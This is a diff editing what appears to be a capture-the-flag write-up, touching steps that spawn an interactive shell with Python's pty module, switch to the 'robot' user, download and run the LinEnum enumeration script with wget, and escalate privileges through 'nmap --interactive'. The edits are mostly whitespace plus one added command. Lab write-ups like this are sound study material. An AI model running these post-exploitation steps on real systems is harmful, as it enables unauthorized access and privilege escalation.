@@ -322,7 +322,7 @@ su: must be run from a terminal
 We need to spawn a proper shell if we want to switch users. To do that we'll use `python`.
 
 ```
-$ python -c 'import pty; pty.spawn("/bin/sh")'        
+$ python -c 'import pty; pty.spawn("/bin/sh")'
 
 $ su robot
 su robot
@@ -347,6 +347,8 @@ cd /tmp
 $ wget raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 
 $ chmod +x LinEnum.sh
+
+$ ./LinEnum.sh
 
 [...]
 
@@ -373,7 +375,6 @@ $ chmod +x LinEnum.sh
 vulnerable to a certain privilege escalation attacking using `--interactive`.
 
 ```
-
 $ nmap --interactive
 nmap --interactive
 
